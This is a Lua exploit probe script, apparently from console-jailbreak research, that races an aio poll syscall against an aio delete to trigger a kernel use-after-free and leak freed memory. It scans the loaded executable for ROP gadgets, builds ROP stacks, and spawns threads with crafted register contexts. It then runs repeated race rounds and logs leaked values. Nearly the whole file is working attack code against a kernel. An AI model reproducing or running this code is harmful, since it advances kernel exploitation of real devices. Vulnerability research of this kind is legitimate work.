-- CRASH_CLASS: HIGH
-- PROBE 721a: race aio poll against aio delete on the same id.
--
-- Context: the poll handler (664) walks to the block object S through the work
-- item and copies S->[+8] out to the caller (8ad714e6: mov eax,[r14+8] then
-- mov [rcx+r15*4],eax). The delete path frees S in its count-1 branch. If the
-- delete wins inside the poll's walk, the poll reads a freed 0x58 chunk and
-- hands four bytes of it back.
--
-- The two children are released together with one umtx wake (719a), so they
-- enter the handlers in the same lock window. Every returned status is
-- classified: 3 and 0x10003 are the ordinary completed states, 0x80020003 is a
-- miss. Anything else is a value read out of memory the table no longer owns
-- and is printed with its address.

print("=== PROBE 721a: poll vs delete ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}
    for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n
    setmetatable(t,getmetatable(syscall.pipe))
    return t
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end); if o then return to_num(v) end end
local function rq(a) local o,v=pcall(function() return memory.read_qword(a) end); if o then return to_num(v) end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-4,4 do memory.write_dword(a+i,0) end end) end

local fn_ud = syscall.pipe.fn_addr
local fn = to_num(fn_ud)
print("[A] pid=" .. tostring(to_num(native.fcall_with_rax(fn_ud, 20))))

local info = memory.alloc(0x200)
wd(info, 0x160)
pcall(function() mk(593)(uint64(0), uint64(info)) end)
local ebase = (rd(info+0x10C) or 0)*4294967296 + (rd(info+0x108) or 0)
local function find_pat(base, limit, pat)
    local chunk, off = 0x1000, 0
    while off < limit do
        local n = math.min(chunk, limit-off)
        local ok, s = pcall(function() return memory.read_buffer(base+off, n) end)
        if not ok or type(s) ~= "string" then break end
        local pos = string.find(s, pat, 1, true)
        if pos then return base+off+pos-1 end
        off = off + n - (#pat-1)
        if n < chunk then break end
    end
    return nil
end
local pop_rax = find_pat(ebase, 0x494000, string.char(0x58,0xC3))
local pop_rdi = find_pat(ebase, 0x494000, string.char(0x5F,0xC3))
local pop_rsi = find_pat(ebase, 0x494000, string.char(0x5E,0xC3))
local pop_rdx = find_pat(ebase, 0x494000, string.char(0x5A,0xC3))
local jmp_g   = find_pat(ebase, 0x494000, string.char(0xEB,0xFE))
if not (pop_rax and pop_rdi and pop_rsi and pop_rdx and jmp_g) then print("[A] gadgets missing") return end

local sc_mmap = mk(477)
local page = 0x4000
local function mmap(px)
    local _, a = pcall(function() return sc_mmap(uint64(0), uint64(px), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0)) end)
    local v = to_num(a)
    if v ~= 0 then zero(v, px) end
    return v
end

local Ctx = {MAGIC=0x108, TYPE=0x110, CS=0x0C0, RIP=0x0E0, RSP=0x0F8, SS=0x100,
             RDI=0x048, RSI=0x050, RDX=0x058, RAX=0x078}
local W = mmap(page)

-- sc = syscall number (664 poll / 662 delete), out = third argument
local function spawn(idpage, out, sc)
    local stack = mmap(page*4)
    local base = stack + page*4 - 0x200
    wq(base,    uint64(pop_rdi)); wq(base+8,  uint64(idpage))
    wq(base+16, uint64(pop_rsi)); wq(base+24, uint64(1))
    wq(base+32, uint64(pop_rdx)); wq(base+40, uint64(out))
    wq(base+48, uint64(pop_rax)); wq(base+56, uint64(sc))
    wq(base+64, uint64(fn))
    wq(base+72, uint64(pop_rax)); wq(base+80, uint64(431))
    wq(base+88, uint64(fn));      wq(base+96, uint64(jmp_g))
    local ctx = memory.alloc(0x500)
    zero(ctx, 0x500)
    wq(ctx+Ctx.MAGIC, uint64(0x480)); wq(ctx+Ctx.TYPE, uint64(0x10000))
    wq(ctx+Ctx.CS, uint64(0x43));     wq(ctx+Ctx.SS, uint64(0x3B))
    wq(ctx+Ctx.RIP, uint64(fn));      wq(ctx+Ctx.RSP, uint64(base))
    wq(ctx+Ctx.RDI, uint64(W));       wq(ctx+Ctx.RSI, uint64(2))
    wq(ctx+Ctx.RDX, uint64(0));       wq(ctx+Ctx.RAX, uint64(454))
    local tb = memory.alloc(8)
    wq(tb, uint64(0))
    local ok, rv = pcall(function() return mk(430)(uint64(ctx), uint64(tb), uint64(0)) end)
    return ok and to_num(rv) == 0
end

local ts = memory.alloc(16)
local function sleep_ms(ms) wq(ts,0); wq(ts+8, ms*1000000); pcall(function() mk(240)(uint64(ts), uint64(0)) end) end

local data = mmap(page)
local ROUNDS = 40
local hits = 0
for r=1,ROUNDS do
    local o = mmap(page)
    local okc, rvc = pcall(function() return mk(669)(uint64(0x1), uint64(data), uint64(1), uint64(1), uint64(o)) end)
    if not (okc and to_num(rvc) == 0) then print("[B] create failed") break end
    local p0 = mmap(page)
    pcall(function() mk(664)(uint64(o), uint64(1), uint64(p0)) end)
    local idpage = mmap(page)
    wd(idpage, rd(o) or 0)
    wd(W, 0)
    local out = mmap(page)
    wd(out, 0xA5A5A5A5)
    local dstat = mmap(page)
    wd(dstat, 0x77777777)
    local kp = spawn(idpage, out, 664)
    local kd = spawn(idpage, dstat, 662)
    if not (kp and kd) then print(string.format("    round %d spawn %s/%s", r, tostring(kp), tostring(kd))) end
    sleep_ms(12)
    for i=1,8 do pcall(function() mk(454)(uint64(W), uint64(3), uint64(2), uint64(0), uint64(0)) end) end
    sleep_ms(15)
    local v = rd(out) or 0
    local d = rd(dstat) or 0
    local known = (v == 0) or (v == 3) or (v == 0x10003) or (v == 0x80020003) or (v == 0xA5A5A5A5) or (v == 0x80020010)
    if not known then
        hits = hits + 1
        print(string.format("    round %d POL L=%08X delete=%08X", r, v, d))
    elseif r % 10 == 0 then
        print(string.format("[B] round %d poll=%08X delete=%08X unusual=%d alive=%d", r, v, d, hits,
            to_num(native.fcall_with_rax(fn_ud, 20))))
    end
end
print(string.format("[C] unusual=%d/%d alive=%d", hits, ROUNDS, to_num(native.fcall_with_rax(fn_ud, 20))))
